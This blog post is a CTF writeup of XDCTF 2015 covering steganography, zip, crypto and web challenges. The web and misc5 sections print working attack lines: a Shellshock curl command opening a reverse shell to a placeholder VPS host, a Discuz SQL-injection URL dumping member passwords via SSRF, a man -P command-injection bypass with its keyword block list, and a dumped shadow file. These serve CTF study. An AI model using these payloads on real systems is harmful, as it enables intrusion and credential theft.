title: XDCTF2015-writeup
date: 2015-10-04 16:30:47
tags:
- Blogs
- ctf
categories:
- Blogs
---
刚刚撸完十一的xdctf，虽说没能拿到好的名词，但是不管怎么说，还是见到了很多奇妙的东西，不得不说p神的很多东西还要学习，还第一次接触关于githack的东西，有空一定好好研究下git.

<!--more-->
因为自己有能力做的题目不算多，所以整理下所有题目的writeup，也贴上一些别人的writeup（侵删）。
# MISC #
xdctf的迷之misc啊...只做出来一道题，所以贴上很多大神队伍的writeup
## 0x01 misc1 图片加密（braintools) ##
原图是这样的![](/img/xdctf2015_writeup/1.png)
开始给出图片拖去比对，发现前两行像素出现差异，也没找到是为什么，知道后来给出提示，去google后找到这样一个东西。
[https://github.com/mbikovitsky/BrainTools](https://github.com/mbikovitsky/BrainTools)

下载后编译得到一串brainfuck代码，所以知道为什么前两行像素会有几位的差异。拖去在线编译，得到flag！

## 0x02 misc2 压缩包明文攻击 ##
题目给出了那个文件，提示是zip，所以拿去binwalk -e一下，得到两个zip，一个是加密的一个是不加密的，仔细观察发现两个文件中都有一个readme.txt的crc相同，说明是完全相同的文件，所以想到用明文攻击。
这里找到一个win环境下非常好用的软件Advanced Archive Password Recovery
![](/img/xdctf2015_writeup/misc2.png)
打开里面的flag.txt得到flag.txt

这里看大神的writeup，还看到一个命令行下的工具pkcrack
！[](/img/xdctf2015_writeup/3.png)

## 0x03 misc3 图片隐写+zlib加密 ##
原图在这里，那去分析发现最左边有一列明显的像素差异，但是完全没有想法翻译成01也没办法组成合理的句子，现在贴上大神的py分析脚本：
![](/img/xdctf2015_writeup/4.png)
```
>>> import Image
>>> a=Image.open('zxczxc.png')
>>> a.point(lambda i: 255 if i&1 else 0).show()
>>> for i in xrange(100):
... print a.getpixel((0,i))
...
(252, 255, 254)
(253, 252, 255)
(254, 252, 252)
(254, 253, 254)
(252, 255, 253)
(252, 253, 254)
(253, 254, 252)
(254, 252, 255)
(253, 255, 253)
(252, 253, 254)
(254, 253, 252)
(254, 253, 253)
(253, 254, 253)
(252, 253, 254)
(252, 255, 252)
...
```
根据大神的说法，这里看出像素差异所以用最后两位藏数据，于是按照像素顺序、RGB顺序、倒数第二第一的顺序排列的01串（原谅我看不懂这句话，py也没玩过图片，所以看不懂大神的脚本）
```
>>> s=''
>>> for i in xrange(165):
... p=a.getpixel((0,i))
... for k in xrange(3):
... s+='1' if p[k]&2 else '0'
... s+='1' if p[k]&1 else '0'
...
>>> s
'0011100100111000001001100011010001100110001000110111010001101001001001010110010001100011001100100011000100110000001011100011001>>> def tostr(s):
... ret=''
... for i in xrange(0, len(s), 8):
... ret+=chr(int(s[i:i+8],2))
... return ret
...
>>> tostr(s)
'98&4f#ti%dc210.27.10.195-2015-09-16T05:21:52+02:0098&4f#ti%dcx\xda\xabHI.I\xab..1NO\xcc3H/2)\
>>>
```
可以看到里面有一串ip和时间，后面看到x\xda头，于是发现是zlib compressed,于是
```
>>> import zlib
>>> zlib.decompress('x\xda\xabHI.I\xab..1NO\xcc3H/2)\xc8\xa8\xd4M\xcdK6H1\xd657\xae(\xd15\xcc
'xdctf{st3gan0gr4phy-enc0d3-73xt-1nto-1m4ge}'
```
Get flag!

## 0x04 misc4 ##

## 0x05 misc5 man命令行注入 ##
非常长见识的一道题目，以前从没见过这样的东西，首先nc连上服务看到提示
**Do you know what's the most useful command in linux?**
简单测试了下，发现两点：
1、通过输入 [f-z]*会爆而[g-z]*不会爆，发现应该是flag文件（事实证明是flag?）
2、输入man命令有效

仔细百度了man命令，发现man -P xxx man,可以读取xxx的文件
所以翻了翻发现了/etc/passwd  /etc/shadow
发现存在/home/ctf 还有一个/home/neighbor-old-wang（后面发现还要回到这里）
于是开始翻/home/ctf，这时候因为没有更多信息，而且不能执行别的命令，所以仍然没有收获，但是无意间发现：
```
man /home/ctf/.viminfo
```
里面得到一个有效信息是存在一个nc_test.sh,于是
```
/home/ctf/nc_test.sh
```
得到了重要信息，得知**man -P 'ls' ls**，这样可以执行命令，于是发现flag？目录，打开看到.flag，打开得到信息在隔壁老王那里，但是neighbor-old-wang需要权限，于是基本卡在了这里，然后misc500就崩了，下面贴上大神的思路，前面基本相同。

它们发现执行man -P set & 可以看到程序相关的逻辑代码：
```
check_lenth ()
{
count=$(echo $1 | wc -m);
if [[ $count -gt $2 ]]; then
echo "Argument too long, 40 limit.";
exit 2;
fi
}
clean_up ()
{
if [[ -z $chat_room ]]; then
cat bye;
exit;
else
echo -e "\033[1;34m$msg_date\033[0m\033[1;31m $username
\033[0m\033[1;34mleaved room\033[0m \033[1;36m \"$room_name\"
\033[0m" >> $chat_room;
cat bye;
exit;
fi
}
hander ()
{
m_cmd=$1;
m_option=$2;
m_selfcmd=$@;
if [[ $m_cmd == 'man' ]]; then
if [[ $m_option == '-P' ]]; then
if [[ -n `echo $m_selfcmd | grep "\""` && `echo $m_selfcmd
| cut -d "\"" -f 3` != '' ]]; then
m_selfcmd=`echo $m_selfcmd | cut -d "\"" -f 2`;
else
if [[ -n `echo $m_selfcmd | grep "'"` && `echo $m_selfcmd
| cut -d "'" -f 3` != '' ]]; then
m_selfcmd=`echo $m_selfcmd | cut -d "'" -f 2`;
else
if [[ $3 == '' ]]; then
echo "man: option requires an argument -- 'P'
Try 'man --help' or 'man --usage' for more information.";
fi;
[[ $4 != '' ]] && m_selfcmd=$3 || echo "What manual
page do you want?";
fi;
fi;
if [[ $m_selfcmd == 'whoami' ]]; then
echo "root";
else
if [[ -n `echo $m_selfcmd | grep -E
"vim|vi|sh|kill|pkill|socat|nc|ncat|nmap|rm|chmod|passwd|etc|root|exp
ort|PATH"` ]]; then
echo "No way.";
else
`$m_selfcmd > m_return` &> /dev/null;
cat m_return;
fi;
fi;
else
if [[ $m_option != '' ]]; then
if [[ `man $m_option` == '' ]]; then
echo "man: option requires an argument --
'$m_option'
Try 'man --help' or 'man --usage' for more information.
";
else
`man $m_option > tmp` &> /dev/null;
cat tmp;
fi;
else
echo "What manual page do you want?";
fi;
fi;
else
echo "invalid command";
fi
}
```
(妈了个鸡，缩进被狗吃了)分析代码后发现可以用man -P "命令" &的方式执行任意命令(前提是命令内容
不能包含:**vim|vi|sh|kill|pkill|socat|nc|ncat|nmap|rm|chmod|passwd|etc|root|export|PATH** 这些字段)

这里根据我前面的分析，发现在tmp目录下有之前输入的东西的缓存保留下，这样可以通过这样的方式执行脚本，大神的思路还是打开查看/etc/shadow
```
root:$6$ZuPfdsng$eN.xStmAbo5SCRQm9bHpA6wtrZisadNJn9lOE./2ks3C.vUVxnKJ
AUIZM6PA7IEphcTgOzo4wOBz.wwD9CSDJ1:16709:0:99999:7:::
daemon:*:16661:0:99999:7:::
bin:*:16661:0:99999:7:::
sys:*:16661:0:99999:7:::
sync:*:16661:0:99999:7:::
games:*:16661:0:99999:7:::
man:*:16661:0:99999:7:::
lp:*:16661:0:99999:7:::
mail:*:16661:0:99999:7:::
news:*:16661:0:99999:7:::
uucp:*:16661:0:99999:7:::
proxy:*:16661:0:99999:7:::
www-data:*:16661:0:99999:7:::
backup:*:16661:0:99999:7:::
list:*:16661:0:99999:7:::
irc:*:16661:0:99999:7:::
gnats:*:16661:0:99999:7:::
nobody:*:16661:0:99999:7:::
libuuid:!:16661:0:99999:7:::
syslog:*:16661:0:99999:7:::
neighbor-old-wang:$6$5/yy2vJZ$Xp1MZOp4D5squxZLmgN4TLV5ktfUP2LD5Rp6l07
lzyUCEES97px/a1EoIM8ZjygGrXdUDYGcoD9lGiCigosdI/:16710:0:99999:7:::
ctf:$6$tcSIbi8j$lDog8sNj0U0m.LuAy8u/MRInv9UP33HQTcPhvHFfSTgDajN.4HGJo
pG1PKMqOYVE7MdhDSlN6K/4DzNrEhy5D1:16709:0:99999:7:::
sshd:*:16701:0:99999:7::
```
把这个丢到join里面跑一下得到隔壁老王的密码是666666（我怎么就没看出来。。。）

ssh 连上之后查看.bash_history 文件
发现让从www.flag.com 里面找flag,
从/etc/hosts 里发现www.flag.com 指向的172.17.0.1
而本机是172.17.0.4 不是一台机器
于是curl www.flag.com
```
function status() {
$.getJSON("/cgi-bin/status", function (data) {
$.each( data, function( key, val ) {
$('#infos').append ( "<li><b>"+key+"</b>: " + val +
"</li>" );
});
});
}
```
看到/cgi-bin/status,感觉是Shellshock 漏洞,于是
**curl -H 'x: () { :;}; /bin/bash -i >& /dev/tcp/VPS_IP/8899 0>&1'http://www.flag.com/cgi-bin/status**
成功得到第二台主机的shell
cat /etc/passwd 得到最终flag:
xdctf{where_there_is_a_shell_there_is_a_way}


# WEB1 #

## web1 phpjm加密 ##
题目简直就是个坑，打开的页面就是一个关于md5的描述，还有一个test，看了变天无果，无意间发现index.php~，get源码，发现时phpjm加密，于是找到网站
[http://tool.lu/php/](http://tool.lu/php/)
解密发现只要让md5加密过的等于0就好，这样用到个黑魔法：
md5('240610708') 's result is  0e462097431906509019562988736854.

md5('QNKCDZO') 's result is 0e830400451993494058024219903391.

0e在php中会被识别为0的次方，于是get flag!

## web2 Apache Tomcat session操纵漏洞 ##
这题目让我知道了一个新的东西，首先翻了翻页面源码，得到存在examples目录，找到曾经有说过tomcat的examples目录下存在一个文件可以修改任意session。
**/examples/servlets/servlet/SessionExample**
进去把login=true
user=Administrator再返回登录界面就可以get flag了

## web3 LFI+SSRF+SQLI ##
题目翻翻发现了任意文件读取漏洞，于是找到：
```
http://133.130.90.188/?link=file://index.php
```
得到源码
```
<?php if (isset($_GET['link'])) { $link = $_GET['link']; // disable sleep if (strpos(strtolower($link), 'sleep') || strpos(strtolower($link), 'benchmark')) { die('No sleep.'); } if (strpos($link,"http://") === 0) { // http $curlobj = curl_init($link); curl_setopt($curlobj, CURLOPT_HEADER, 0); curl_setopt($curlobj, CURLOPT_PROTOCOLS, CURLPROTO_HTTP); curl_setopt($curlobj, CURLOPT_CONNECTTIMEOUT, 10); curl_setopt($curlobj, CURLOPT_TIMEOUT, 5); $content = curl_exec($curlobj); curl_close($curlobj); echo $content; } elseif (strpos($link,"file://") === 0) { // file echo file_get_contents(substr($link, 7)); } } else { echo<<<EOF <!--你瞅啥--> <br><br><br> <center> <h1>What do you want to read?</h1> <form method="GET" action="#"> <input style="width:300px; height:25px;" name="link" value="" /> <button style="height:25px;" type="submit">Read</button> </form> </center> EOF; } ?>
```
读取源码发现可以内网ssrf（菜鸡表示并没有看出来）
翻翻文件发现/etc/host里面有个域名
**9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com** 
扫下端口发现
**http: //9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:3389**
发现是一个Discuz论坛，看版本是7.2，然后去百度，发现存在注入点，于是，
payload:
```
http://133.130.90.188/?link=http%3A%2F%2F9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com%3A3389%2Ffaq.php%3Faction%3Dgrouppermission%26gids%5B99%5D%3D%2527%26gids%5B100%5D%5B0%5D%3D%29%2Band%2B%28select%2B1%2Bfrom%2B%28select%2Bcount%28*%29%2Cconcat%28%28select%2B%28select%2B%28select%2Bconcat%28username%2C0x27%2Cpassword%29%2Bfrom%2Bcdb_members%2Blimit%2B1%29%2B%29%2Bfrom%2Binformation_schema.tables%2Blimit%2B0%2C1%29%2Cfloor%28rand%280%29*2%29%29x%2Bfrom%2Binformation_schema.tables%2Bgroup%2Bby%2Bx%29a%29%2523%23#
```
```
http://133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:3389/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)+and+(select+1+from+(select+count(*),concat((select+(select+(select+concat(username,0x27,password)+from+cdb_members+limit+1)+)+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)%23##
```
get flag!

## web4 sqli ##
进入页面翻翻源码可以得到提示：
![](/img/xdctf2015_writeup/5.png)
<!--Please input the ID as parameter with numeric value-->

于是发现图片存在注入点，用 ID 注入后果然就可以改变了，但是很多主流的函数如 select,substr,union,left,right,midselect,substr,union,left,right,mid 等都被过滤了，无奈尝试别的东西，发现有一个lpad函数可以使用bool盲注。
结果发现存在username=admin,于是开始跑password
```
/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=2"%20or%20lpad(password,21,space(1))=0x3538333266343235316362366634333931376466%23
```
得到密码是20为的md5，所以还要删减，按照大牛的说法就是猜测为dedecms加密方式，所以去掉前3后1，解密得到密码，明文登录即可找到flag

发现了一个牛逼的lpad函数，一会儿专门研究过放在专门的博客里面。

# web2 #

web2是p牛写的cms，漏洞都是大牛实战中遇到的，这里也是长见识了。
题目是这样的：
![](/img/xdctf2015_writeup/6.png)
## web2  git源码泄露 ##
这道题的入口关于git源码泄露完全是一个没接触过的东西，这里也算是长了见识，百度githack，发现了一个工具叫Githack,按照p牛自己写的writeup，这里只能得到readme.md
然后得到提示：**All source files are in git tag 1.0**
这样可以推理得到当时时雨的工作顺序：
git init
git add
.
git commit
git tag1.0
git rm –rf*
echo
“All source files are in git tag 1.0” >README.md
git add .
git commit

于是真正的源码在tag==1.0 的commit中

这里根据git的目录结构，找到/.git/refs/tags/1.0 这个文件其实是commit的一个链接，里面发现一个hash，发现时一个sha1的commondid。
说实话，这里后面p神的分析我就看不太懂了，所以这里挂上网盘地址，有机会可以继续研究
[http://pan.baidu.com/s/1kTq3Ceb](http://pan.baidu.com/s/1kTq3Ceb) 密码为2ep2
[里面提到的py脚本](http://pan.baidu.com/s/15Fcz8)密码为l4l8

我们这里用的方法是rip-git.pl 去拖源码，得到上面说的sha1加密的hash之后，替换的掉.git/refs/heads/master 的hash。然后**$ git checkout -f **
得到源码
[http://pan.baidu.com/s/1i30bgcX](http://pan.baidu.com/s/1i30bgcX) 密码gakj

## web1  前台密码找回逻辑漏洞 ##
在官方给出hit之前，审计代码后发现在/xdsec_app/front_app/controllers/Auth.php里面的有验证码的函数：
```
public function handle_resetpwd()
{
	if(empty($_GET["email"])||empty($_GET["verify"]))
{
	$this-­‐>error("Badrequest",site_url("auth/forgetpwd"));
}
$user=$this-­‐>user-­‐>get_user(I("get.email"),"email");
if(I('get.verify')!=$user['verify'])
{
	$this-­‐>error("Your verify code is error",site_url('auth/forgetpwd'));
}
```
所以构造
**http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-­cms@xdctf.com&verify[1]=aa**
这里有个很大的坑是邮箱并不是p神的邮箱，是首页中写到的版权声明里面的邮箱


## web3 代码审计+盲注 ##
## web4 getshell ##
web题目到了这里已经是我接触不懂的级别了，所以这里还是挂上p神的writeup然后，有机会再研究。
[300的](http://pan.baidu.com/s/1eQrZEJg)密码：0m33
[里面提到的py注入脚本](http://pan.baidu.com/s/1bnz7s7P)密码：qpys
[400的](http://pan.baidu.com/s/1eQdM7a6)密码：jxbo


# CRYPTO
谜一样的crypto,不管怎么样，这里贴上crypto100的解法
# crypto100 大写字母playfair加密
密文：
```
HQPEAGEPHQQUAEGQCEAGYSRUHAGPAIWNAPLONGDRZRIEEMQHOYGPOVRIBLQNALOBDPNKRPAZRACOORWRLCLOTBLUMRIABOESOFBOHQROAOENLUHQRWRDDPGUHCGPNOQLAGGBKBPGNEENLNNGEQIRARCLQDBEPDZXRACOORWRLCLOTBLUMRIABOESOFBOQNLCUARPQKAGWZZEHQHQRGTBEMOINGCPCWPIATWWQAOGRUESAMRUMEQCGPGUAPBYNGHQPGEMGXBWOBUCHQPGQAPIUQHCGPDRDPLOEAATWWQAALOBDPNKRPCTYBQOOGQBGPORFEQUDTULDFSARIPDZLNKENGDUKBEIPEFGPKKQAWGEBEFPEQOAERACOORWRLCLOTBLUMRIABOESOFBOQNCFMPIBEPOCEPQBERBBIANGHQPRLNPIGKXXCTUCENMMIANGHQPRICEMURBXKLULFOZZBTDPOFGNEVMPAPUQSRZXRACOOQBDLOTBLUMRIABOESOFBOCOAOENRUUDZZLUULBBRDCOOQCXQAAGUCCOAOENRUORXZNESKPIRPWRQKPGBOOQHQRUHGNEXGRDQHNWQAROQOWEAGEPOQBQTBLUMRIACOAZAERIRSQAALOBDPNKRPMZQCRIDZQBRDPESEBYAUVOIRGLEGAPLNCOCIEMQHAWNUORZZIRGLDGEMQHLYCPAGUDDGOQDQUFRUCMSIHQTBUQGINGWSQMCWRAUGPGPEAWQDNGFEAGKKERBEOBUCCPLDSITBEUOUUQGINGWSQMCWRAUGRGEPQKNCUGOCAAWEEDRIARDDOBUCUQGINGWSQMCWRAUGRGENGDEPBOXGPELWQNPNOIQBSNLOCHNENCTTAUKIRGBXQNDTKKPEIAKLHQLOAQIFUQHRPEOLDNDPQOCOBUBTQQPEIAKLHQAERUBUNGEQIRARCLQDBEPDIIQNGTWRALROHQRWPAPECOUQNFEPTBRZLONMGREROFANQCRUOIAQEWLFZEHQHQRGDEHQHQTBNOAGCVIAUNOOPERUMENLIAIGTHRZAOSATAHBUGLUULZZRLLROWDTBFAQBETDDGGOSATAHBQUQNHQATENIROCOWDTBFAQOANEMEGOSATAHBSEQNLUEDOCOWDTBFAQHQLOISKUCOAMGPKKQUNGQNCVNEHQPEVFPDRPYSOQZEOFHQTBUQGIGQXAMPZZPDODDPQOATOCUCZEDDALTFCOOATZCACHROEUXLEBVKDEPV
```
看到这么一长串大写字母直接蒙了。。。这什么啊，后来看到writeup，后来发现还是习惯不好，如果去百度大写字母 加密，就得到下面的：
Playfair密码（英文：Playfair cipher 或 Playfair square）是一种替换密码，1854年由查尔斯·惠斯通（Charles Wheatstone）的英国人发明。现时，波雷费密码被视为十分不安全的。

编写密文:
1、选取一个英文字作密钥。除去重复出现的字母。将密匙的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的2英文字母依a-z的顺序加入。（将I和J视作同一字。JOY -> IOY）
2、将要加密的讯息分成两个一组。若组内的字母相同，将 X 加到该组的第一个字母后，重新分组。若剩下一个字，也加入 X 字。（ee st um p->EX ES TU MP）。
3、在每组中，找出两个字母在矩阵中的地方。
4、若两个字母同列，取这两个字母下方的字母（若字母在最下方则取最上方的字母，PB->IK，BT->KP）。
5、若两个字母同行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。
6、若两个字母不同行也不同列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角（HI->BM）。
7、新找到的两个字母就是原本的两个字母加密的结果。

于是发现这样一个网址
[http://www.cs.miami.edu/home/burt/learning/Csc609.051/programs/playn/](http://www.cs.miami.edu/home/burt/learning/Csc609.051/programs/playn/)
解密不太准确，大致看出是i Have a dream 修改下get flag!






